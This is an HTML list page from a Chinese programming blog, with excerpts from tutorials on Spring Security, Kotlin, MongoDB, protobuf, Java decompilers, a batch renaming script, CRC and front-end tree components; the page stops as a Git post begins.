<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b04afde885d9fe9870124b82259541e0/" rel="bookmark">
			SpringBoot——Spring Security 框架
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		优质博文：IT-BLOG-CN
一、Spring Security 简介 Spring Security是一个能够为基于Spring的企业应用系统提供声明式的安全访问控制解决方案的安全框架。它提供了一组可以在Spring应用上下文中配置的 Bean，充分利用了Spring IoC，DI（控制反转 Inversion of Control ，DI：Dependency Injection 依赖注入）和AOP（面向切面编程）功能，为应用系统提供声明式的安全访问控制功能，减少了为企业系统安全控制编写大量重复代码的工作。
二、Spring Security 入门Demo 【1】创建Maven工程（war形式）：spring-security-demo
【2】修改pom.xml目录，如下：
&lt;!-- 集中定义依赖版本号 --&gt; &lt;properties&gt; &lt;junit.version&gt;4.12&lt;/junit.version&gt; &lt;spring.version&gt;4.2.4.RELEASE&lt;/spring.version&gt; &lt;pagehelper.version&gt;4.0.0&lt;/pagehelper.version&gt; &lt;servlet-api.version&gt;2.5&lt;/servlet-api.version&gt; &lt;dubbo.version&gt;2.8.4&lt;/dubbo.version&gt; &lt;zookeeper.version&gt;3.4.7&lt;/zookeeper.version&gt; &lt;zkclient.version&gt;0.1&lt;/zkclient.version&gt;	&lt;mybatis.version&gt;3.2.8&lt;/mybatis.version&gt; &lt;mybatis.spring.version&gt;1.2.2&lt;/mybatis.spring.version&gt; &lt;mybatis.paginator.version&gt;1.2.15&lt;/mybatis.paginator.version&gt; &lt;mysql.version&gt;5.1.32&lt;/mysql.version&gt;	&lt;druid.version&gt;1.0.9&lt;/druid.version&gt; &lt;commons-fileupload.version&gt;1.3.1&lt;/commons-fileupload.version&gt; &lt;freemarker.version&gt;2.3.23&lt;/freemarker.version&gt; &lt;activemq.version&gt;5.11.2&lt;/activemq.version&gt; &lt;security.version&gt;3.2.3.RELEASE&lt;/security.version&gt;	&lt;solrj.version&gt;4.10.3&lt;/solrj.version&gt; &lt;ik.version&gt;2012_u6&lt;/ik.version&gt;	&lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-core&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-web&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-webmvc&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-context-support&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-test&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b04afde885d9fe9870124b82259541e0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/db975bd503066acb0442cc17dfdf7de5/" rel="bookmark">
			Kotlin应用——使用kt进行web开发 &amp; 使用h2database进行初始化数据库 &amp; mybatis-plus使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Kotlin 是一门现代但已成熟的编程语言，旨在让开发人员更幸福快乐。 它简洁、安全、可与 Java 及其他语言互操作，并提供了多种方式在多个平台间复用代码，以实现高效编程。
kt入门的合集文章如下：
Kotlin学习——kt入门合集博客 &amp; kt里的委派模式Delegation &amp; kt里的特性 目录 引出依赖配置，主启动1.引入依赖2.配置application.yml文件3.准备sql语句4.主启动类 kt进行web开发1.使用kt写实体类2.mapper，dao3.controller 启动进行测试总结 引出 1.使用kt进行web开发；
2.使用h2database进行初始化数据库；
3.使用 lateinit 关键字，变量在定义时不需要初始化；
依赖配置，主启动 1.引入依赖 &lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.6.14&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;groupId&gt;com.tianju&lt;/groupId&gt; &lt;artifactId&gt;spfa-rpc-demo&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt; &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt; &lt;kotlin.version&gt;1.8.22&lt;/kotlin.version&gt; &lt;kotlin.compiler.incremental&gt;true&lt;/kotlin.compiler.incremental&gt; &lt;netty.version&gt;4.1.91.Final&lt;/netty.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/db975bd503066acb0442cc17dfdf7de5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7bc01ef86ea3ad1f3d50e5e8c0c79f88/" rel="bookmark">
			一篇文章带你掌握MongoDB
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. 前言2. MongoDB简介3. MongoDB与关系型数据库的对比4. MongoDB的安装5. Compass的使用6. MongoDB的常用语句7. 总结 1. 前言 本文旨在帮助大家快速了解MongoDB,快速了解和掌握MongoDB的干货内容.
2. MongoDB简介 MongoDB是一种NoSQL数据库，采用了文档数据库模型。它以BSON（Binary JSON）格式存储数据，支持动态模式和灵活的查询语言。MongoDB具有以下特点：
文档存储：MongoDB以文档（Document）的形式存储数据，每个文档是一个自包含的数据单元，类似于关系型数据库的行。动态模式：MongoDB不需要预定义的表结构，可以根据需要动态添加字段，更加灵活。分布式存储：MongoDB支持分片和副本集等方式进行水平扩展和高可用性部署。强大的查询语言：MongoDB支持丰富的查询语言，包括嵌套查询、索引和聚合操作等，可以满足各种查询需求。 MongoDB适用于需要处理半结构化数据、大规模数据和高并发读写的场景，例如Web应用的用户数据、日志数据的存储和分析等。它提供了灵活的数据模型和强大的查询能力，使得开发者可以更加高效地处理复杂的数据操作。
NoSQL（Not Only SQL）是一种非关系型数据库（Non-Relational Database）的分类，与传统的关系型数据库（RDBMS）相对应。NoSQL数据库的设计目标是解决关系型数据库在大规模数据存储和高并发读写方面的限制。
3. MongoDB与关系型数据库的对比 MongoDB是一个文档型数据库，而关系型数据库则是一种基于表格的数据库。
可以看到还是有许多相似的地方,但也有很多不同.MongoDB提供了更好的可扩展性和大数据处理能力，而关系型数据库则更适用于小型企业和机构级别的数据处理。
4. MongoDB的安装 官网:MongoDB：应用程序数据平台 | MongoDB
选择Community Server
选择版本以及对应的操作系统后,点击 Download 即可开始安装
下载完成之后打开安装包,一直点击 next 就可以了
安装完成之后,桌面会出现一个MongoDB的GUI工具Compass的快捷方式
5. Compass的使用 双击打开,会看到以下界面:
点击Connect即可连接本地的MongoDB服务
注: admin,config和local为MongoDB默认的数据库
此外在Compass的下方有一个mongosh的交互式命令行终端,就可以输入一些命令来操作MangoDB
6. MongoDB的常用语句 查看数据库:
show databases show dbs MongoDB 中默认的数据库为 test，如果你没有创建新的数据库，集合将存放在 test 数据库中。
选中/创建数据库:
use [database] 注: 即使这个数据库不存在也可以运行.如果数据库不存在，则创建数据库，否则切换到指定数据库。
示例:
可以看到虽然创建了game数据库,但是查看数据库时并没有这个数据库.这是因为数据库中没有数据
接下来我们来插入几条数据,但首先先来了解一下MongDB中文档的概念:
MongoDB集合是MongoDB文档数据存储的基本单位，类似于关系数据库中的表。它是一个无架构的容器，可以存储任意的文档数据。MongoDB的文档数据是使用JSON格式表示的，它们可以包含不同的字段和值。
插入一个文档到集合中:
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7bc01ef86ea3ad1f3d50e5e8c0c79f88/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a38a15f9fed631351e4de0029eb01b71/" rel="bookmark">
			Unity之C#中使用protobuf
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Unity中使用protobuf分三个步骤： 第一步、生成.dll文件，导入Untiy的Plugins文件夹中； 第二步、将.proto文件编译成.cs文件，导入Unity中； 第三步、代码调用； 第一步、生成.dll文件，导入Untiy的Plugins文件夹中； ①、下载官方protobuf，地址： https://github.com/protocolbuffers/protobuf/releases
②、用vs打开：protobuf-22.2/csharp/src/Google.Protobuf.sln
③、vs 打开后，因为我们只需要 net45，所以删除 Google.Protobuf.sln 中的 net50，如下图：
④、vs 设置为 Release 模式，然后右键选中 Google.Protobuf --&gt; 生成，即可生成需要的 dll 文件，生成的文件位于 protobuf-22.2/csharp/src/Google.Protobuf/bin/Release/net45 目录下，如下图：
⑤、将net45中所有文件导入Unity的Plugins文件夹中，如下图：
第二步、将.proto文件编译成.cs文件，导入Unity中； ①、编写.proto文件：新建txt文本，重命名为Test.proto，文件内容为：
syntax = "proto3"; package msg; option java_package = "game.msg"; // 消息结果。 message MessageResult { // 结果码。 int32 code = 1; // 消息内容。 string msg = 2; } ②、下载官方protoc，地址： https://github.com/protocolbuffers/protobuf/releases/tag/v22.2
③、输入命令编译.proto，为了方便，编写一个.bat文件，新建txt文本，重命名为compile_CS.bat，文件内容为：
chcp 65001 REM 编译.proto文件，转换为C#，输出到当前目录下 @echo compile proto to C# @call protoc.exe --csharp_out .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a38a15f9fed631351e4de0029eb01b71/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c0f0d8bde2774934baa298cb9945378c/" rel="bookmark">
			WSL中安装的Pycharm如何在Windows的开始菜单中新建图标？或WSL中的Pycharm经常花屏
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		WSL中安装的Pycharm如何在Windows的开始菜单中新建图标？或WSL中的Pycharm经常花屏 ⚙️1.软件环境⚙️🔍2.问题描述🔍🐡3.解决方法🐡🤔4.结果预览🤔 ⚙️1.软件环境⚙️ Windows10 教育版64位
WLS2 Ubuntu-20.04-e
🔍2.问题描述🔍 WSL系统可以很方便的让我们在Windows系统上面直接运行Ubuntu环境，但有点不好的是，WSL始终GUI的支持没有Windows好，比如我们在WSL中安装了Pycharm之后，都需要先启动WSL的bash命令行，然后在命令行中输入相应的命令才能打开Pycharm，这很麻烦，有没有一种可能：
不用预先启动WSL，直接在Windows的开始菜单中点击Pycharm图标，就能直接打开Pycharm呢？
注意：你如果是用装在Windows上面的Pycharm远程连接WSL上的虚拟Python环境进行调试（如下图），那这边文章的受众不是你，你可以关闭本篇博客了！
再次强调，是打开装在WSL上面的Pycharm，而不是装在Windows上面的Pycharm！！
再次强调，是打开装在WSL上面的Pycharm，而不是装在Windows上面的Pycharm！！
再次强调，是打开装在WSL上面的Pycharm，而不是装在Windows上面的Pycharm！！
比如，可以看到此时我们的WSL并没有提前启动：
但我们可以像打开Windows应用一样，在开始菜单直接打开WSL上面的Pycharm：
可以看到，在我们点击图标之后，顺利启动了Pycharm：
完整示意见下方动图：
并且你如果像chrome那样用wsl直接调用执行pycharm启动命令，然后开始菜单文件夹中生成的pycharm快捷方式，很可能会被系统自动删除：
甚至wsl中的pycharm经常花屏，多半也是这个问题引起的。
那这个时候又该怎么办呢？
🐡3.解决方法🐡 获取解决工具/代码 百度网盘下载我提供的工具：Windows新建安装在WSL上面的Pycharm图标：
链接：https://pan.baidu.com/s/133P441gUc9BZm6pidrsn7g?pwd=6kmi 提取码：6kmi，下载后打开微信支付.png使用微信扫码支付：
​​
2.获取压缩包密码：
第1种方式：付款后微信留言购买的资源名称，博主会微信回复你解压密码（推荐，不需要加好友）： ​​​​ 第2种方式：截图支付凭证以及资源名称，在CSDN私信博主，博主会CSDN私聊你解压密码：
注意：由于虚拟软件的可复制性，一旦售出，便会产生多个副本，因此概不退款，谢谢合作！ 🤔4.结果预览🤔 直接可以使用开始菜单的图标打开WSL中的Pycharm：
​
渣男！都看到这里了，还不赶紧点赞，评论，收藏走一波？
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a61a06b3ea2731e07d244c24c712df4b/" rel="bookmark">
			将class文件反编译成java文件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、IDEA自带的Java Bytecode Decompiler 对于需反编译的class文件Kb比较大时，反编译后的文件就会报一大堆错误，适用于小Kb或者比较简单的class反编译
二、Jad jad是一个简单易用的命令行工具，适合快速简单的反编译任务
1.Jad下载地址 http://www.kpdus.com/jad.html
2.Jad使用方法 执行命令
jad -o -r -s java -d src TriggerFlow.class Jad的开发2006年似乎已停止，唯一遗憾的点就是不能反编译中文，中文字符会转换成Unicode编码。
三、JD-GUI JD-GUI提供了更多功能和更好的用户体验，适合需要进行更多操作的用户
1.JD-GUI下载地址 http://java-decompiler.github.io/
2.JD-GUI使用方法 拖拽上去然后ctrl+s就可保存源码，可以说是非常方便，强推！
3.JD-GUI设置保存，不使用行号，不使用源数据 Help -&gt; Preferences
打包链接：https://pan.baidu.com/s/1d-WxrtbcDv0jh5-PxVSWSA?pwd=78yw 提取码：78yw
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/59dafcb8affe4e0f3f8459fc148014df/" rel="bookmark">
			windows下用bat脚本批量删除文件名中的词语
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		@echo off
set /p str1= 请输入要替换的文件(文件夹)名字符串（可替换空格）：
set /p str2= 请输入替换后的文件(文件夹)名字符串（去除则直接回车）：
echo.echo 正在修改文件(夹)名中，请稍候……
for /f "delims=" %%a in ('dir /s /b ^|sort /+65535') do (
if "%%~nxa" neq "%~nx0" (
set "file=%%a"
set "name=%%~na"
set "extension=%%~xa"
call set "name=%%name:%str1%=%str2%%%"
setlocal enabledelayedexpansion
ren "!file!" "!name!!extension!" 2&gt;nul
endlocal
)
)
exit
在文件夹下新建文档文档，重命名为.bat,然后将上一段代码拷贝进去，保存，关闭，双击运行即可。由于这段代码中的提示文字在我的电脑上显示乱码，可参照知乎答主的回答。
如何批量去除文件名中的某些字符串？ - 知乎
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/512e5b251d2633406a85a01f140943e6/" rel="bookmark">
			[Note]对于CRC的思考
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		定性分析
假设有一个要传输的数据为15，规定一个除数为7，那么，先将15进位，为150，然后将150除以7，余数为3，为了让传输结果可以整除7，需要设置传输数据为150+（7-3）=154，这样，154除以7为0。最后一位的4就是冗余位。如果接收方收到的结果除以7结果不是0，则表示传输出错，如果是0，则表示传输成功。
如果传输过程中发生出错，154可能会变成一个随机数，如果变成的这个随机数也可以整除7，那么此次校验就失败了，那么，直观上看，000~999之间，能够找到一个被7整除的数字的概率是1/7，我们就可以初步地认为这个除数7的传输错误率为1/7。根据此分析，可以得到除数的一个直观的规律，那就是有可能是除数越大，错误率越低。
CRC也是如此，在出错概率相同，出错位数相同的情况下，CRC16的性能是优于CRC8的。
但是，除了除数的大小之外，除数本身的特性也是会影响出错概率的，例如除数7和除数8，如果传输数据154出错了，假设它只有最高位出错，那么对于除数7，只有854能整除7，而对于除数8，354、554、754、954都可以整除8，因此，除数本身的性能也是要考虑的因素。
综上，例子中的除数对应的是crc的生成多项式，生成多项式的性能，我认为主要受到2个因素影响：
生成多项式的长度生成多项式的特性，如不可分解性等（类似质数的特性，只有1和本身两个因子） 找到性能良好的生成多项式是数论的课题，应用上我认为认识到这个程度就足够了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/72bb02fac6c5fcd4976fc7a3d2e06615/" rel="bookmark">
			Sourcepawn 脚本入门(一)准备
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		🍎Sourcepawn 脚本入门(一)准备 1.Sourcepawn是什么? Sourcepawn是SourceMod团队开发的基于source-sdk的服务器插件开发的一种脚本语言。
SourceMod: Half-Life 2 Scripting
它适用于大部分起源引擎的游戏，多见于L4D，CSS,CSGO，
2.Sourcepawn的开发工具 Sourcepawn的开发工具有多种。只要下载了sourcemod，写在文本里保存为.sp格式再使用scripts文件夹里的spcomp编译即可。
对于有开发基础和没有开发基础的人，我都推荐使用VSCode(安装SourceMod插件)
Ctrl+Shift+P,输入SM，将弹出插件内容提示
3.SP的编译和运行 当你使用SM Create Project后，它会自动创建一个Snippet,自己打开sp文件，点击右上角的运行按钮就可以直接编译，构建的成败将在输出栏中提示，编译成功后（单个sp）,会在scripts文件夹中生成对应名称的smx文件。
4.测试插件（以CS起源服务器为例） 首先，需要安装一个Source游戏的服务器(Windows和Linux都可以)，这里我使用Windows和CS起源服务器为例。
🌀安装CS起源服务器可以参照我的前一篇文章（虽然系统为Linux）：
华为云云耀云服务器L实例评测｜搭建CounterStrike Source Delicated Server（CS起源游戏服务器）-CSDN博客
当你安装完成后，将得到如下服务器文件
1️⃣将Metamod和Sourcemod安装到服务器中 Metamod:Source - Snapshots (metamodsource.net)
SourceMod: Half-Life 2 Scripting
下载最新的MetaMod和Sourcemod(注意版本要匹配，都是最新的就可以),都解压到上图中的cstrike文件夹中
2️⃣将VSCode中编译好的.smx文件放入指定文件夹中 在安装sourcemod的文件夹中找到plugins文件夹，将插件复制到此处。
3️⃣启动服务器，查看插件状态 当你完成后就需要启动服务器，使用sm plugins list命令查看安装插件的状态
5.客户端连接测试 🎉这是最后一步，你只需要打开和登录Steam打开对应的游戏，然后连接你自己的服务器即可[connect IP或者在联机游戏中查找]。（💥切记服务器开放游戏服务器对应的端口！）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1f0c59d2a5c1b6e150e6b022b6b0e7fe/" rel="bookmark">
			JavaScript中的时间日期函数new Date()（JS中5种获取时间戳的函数）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简介：JavaScript 中的 new Date() 方法用于创建一个新的 Date 对象，该对象表示当前日期和时间。Date 对象提供了许多方法和属性，可以用于获取和设置日期和时间信息。
new Date([year, month, day, hour, minute, second, millisecond])
其中，每个参数都是可选的。如果没有指定参数，则 new Date() 方法将创建一个表示当前日期和时间的 Date 对象。
一、关于new Date()函数；
首先创建一个表示当前时间的 Date 对象 var nowTime = new Date(); console.log(nowTime); 控制台输出 Fri Nov 17 2023 10:41:58 GMT+0800 (中国标准时间) //获取 Date 当前时间 年月日时分秒 console.log(nowTime.toLocaleString()); //控制台输出 2023/11/17 10:41:58 //获取 Date 当前时间 年月日 console.log(nowTime.toLocaleDateString()); //控制台输出 2023/11/17 //获取 Date 当前时间 时分秒 console.log(nowTime.toLocaleTimeString()); //控制台输出 10:41:58 //获取 Date 对象的年份 console.log(nowTime.getFullYear()); //控制台输出 2023 //获取 Date 对象的月份（注意月份从0开始，所以使用时需要加1） console.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1f0c59d2a5c1b6e150e6b022b6b0e7fe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b8c5e0df94089e28e0f5e20942d6dbe6/" rel="bookmark">
			使用idea创建到编写接口（springboot&#43;mybatis&#43;前端）（幼儿级别教学）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
创建
创建项目后。拉进idea中。即可开始编写。
先配mysql的连接
entity写数据与数据库实体类一一对应
写mapper接口，
在application.properties配置mybatils扫描mapper的路径
定义接口路径，调用方法，拿到对象
进阶：post新增请求：
进阶：put更新数据（根据id修改）
进阶：delete删除数据（根据id删除）
进阶：get（根据id查询）
*注意：代码拷贝进去，有些import没加，自己鼠标移动上去自己加一下。
创建 在https://start.spring.io/
创建项目后。拉进idea中。即可开始编写。 先配mysql的连接 entity写数据与数据库实体类一一对应 写mapper接口， 在application.properties配置mybatils扫描mapper的路径 定义接口路径，调用方法，拿到对象 在项目的application.properties中配置连接数据库：
如下，粘贴进去改一改。
//访问地址：8080，自己改喜欢的，不冲突的 server.port=8080 //数据库连接地址，localhost:3306,数据库名字lan，后面无关紧要 spring.datasource.url=jdbc:mysql://localhost:3306/lan?serverTimezone=GMT%2B8&amp;characterEncoding=utf-8&amp;useSSL=false //数据库用户名 spring.datasource.username=blue //数据库密码 spring.datasource.password=blue12345 //必填，拷贝进去就行 spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver 添加文件夹：controller（对外提供接口），entity，mapper
在DemoApplication里面填写扫描mapper文件夹下的文件代码：
关键句就是@MapperScan（“com.example.demo.mapper”）,其他默认就行
@SpringBootApplication //MapperScan让mybatils扫描mapper文件 @MapperScan("com.example.demo.mapper") public class DemoApplication { public static void main(String[] args) { SpringApplication.run(DemoApplication.class, args); } } 在UserMapper接口中编写数据库查询逻辑：user就是表内的表单，你的表单是什么就是写什么
图例：看最下面那个user，就是下面对应的select * from user的user
public interface UserMapper { //注解加sql语句的方式来查询 @Select("select * from user") //findAll()查询所有数据库的对象 List&lt;User&gt; findAll(); } 创建实体类User，在User中编写数据库一一对应的数据字段类型：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b8c5e0df94089e28e0f5e20942d6dbe6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d65eba76d21bb79861b18e452f41fd68/" rel="bookmark">
			uniapp的树形选择器，tki-tree组件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		根据：树形选择器增强版，支持多选、单选、父级选择，Picker形式 - DCloud 插件市场 树形选择器：使用tki-tree组件： 先导入并注册组件：
在javascript中：export default外放import，在export default内data外放注册components
import tkiTree from "@/commons/tki-tree/tki-tree.vue" components: { tkiTree, }, 在template中写：
&lt;tki-tree ref="tkitree" :range="range" :rangeKey="rangeKey" confirmColor="#4e8af7" /&gt; 在data的return中写:
data() { return { ascName: '', userId: '', list: { "address": "", "asc": "", "dept": "", "email": "", "idNumber": "", "phone": "", "realName": "" }, duoxuan: [{ id: 6, name: '湖南省', }, ] } }, 在javascript内data外写：
let testList = [{ id: 1, name: '北京市', children: [{ id: 11, name: '市辖区', children: [{ id: 111, name: '西城区', children: [{ id: 1111, name: '南河沿大街', children: [{ id: 11111, name: '紫金宫饭店', checked: true }, ] }, ] }, { id: 112, name: '东城区', }, { id: 113, name: '朝阳区', }, { id: 114, name: '丰台区', } ] }, ] }, { id: 2, name: '河北省', children: [{ id: 21, name: '石家庄市', }, { id: 22, name: '唐山市', }, { id: 23, name: '秦皇岛市', }, ] }, { id: 3, name: '山东省', children: [{ id: 31, name: '济南市', children: [{ id: 311, name: '历下区', children: [{ id: 3131, name: '解放路街道办事处', }, ] }, { id: 312, name: '槐荫区', }, { id: 313, name: '天桥区', }, { id: 314, name: '历城区', }, { id: 315, name: '长清区', } ] }, { id: 32, name: '青岛市', }, { id: 33, name: '临沂市', children: [{ id: 331, name: '兰山区', children: [{ id: 3331, name: '金雀山街道', }, ] }, { id: 332, name: '河东区', }, { id: 333, name: '罗庄区', children: [{ id: 3331, name: '盛庄街道', }, ] } ] }, { id: 34, name: '日照市', }, { id: 35, name: '淄博市', }, { id: 36, name: '枣庄市', }, { id: 37, name: '东营市', }, { id: 38, name: '潍坊市', }, { id: 39, name: '烟台市', }, { id: 40, name: '济宁市', }, { id: 41, name: '泰安市', }, { id: 42, name: '威海市', }, { id: 43, name: '滨州市', }, { id: 44, name: '菏泽市', }, ] }, { id: 4, name: '河南省', }, { id: 5, name: '湖北省', }, { id: 6, name: '湖南省', } ] 页面加载时调用：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d65eba76d21bb79861b18e452f41fd68/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/656399b87a2fdd3bef5080e34162f30c/" rel="bookmark">
			【github】EasySignSeekBar 三方库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		// 三方库使用滑动模块 implementation "com.zhouyou:signseekbar:1.0.6" github地址
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/59ed735b3ae74adb2cf9d98200cd2194/" rel="bookmark">
			echart中定义选中区域图标和事件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1.在options中配置brush options:{ brush:{ toolbox:['rect','lineX'], xAxisIndex:0, throttleType:'debounce', throttleDelay:100 } } 2.给绘图实例绑定事件 const charts = echarts.init(this.refs.echart) echart.off('brushSelected') echart.on('brushSelected',(params)=&gt;{ console.log(params) }) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a64f1f349f730f833d91e2e47e0239d3/" rel="bookmark">
			layui中使用Dtree,引入checkbar属性后仍不显示复选框（解决办法）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		可能因为数据的问题，数据要有checkArr属性，且必须是数组
数据代码
var treeData = [ { "id": "001", "title": "供应商A", "parentId": "0", /"checkArr": [{ "type": "0", "checked": "1" }], "children": [ { "id": "001001", "title": "供应商A-1", "parentId": "001", "checkArr": [{ "type": "0", "checked": "0" }], "children": [ { "id": "001001001", "title": "供应商B-1", "last": true, "parentId": "001001", "checkArr": [{ "type": "0", "checked": "0" }] }, { "id": "001001002", "title": "供应商B-2", "last": true, "parentId": "001001", "checkArr": [{ "type": "0", "checked": "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a64f1f349f730f833d91e2e47e0239d3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c7b5b119b475ed5c62904e18582a615f/" rel="bookmark">
			版本控制系统Git学习笔记-Git基础操作
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
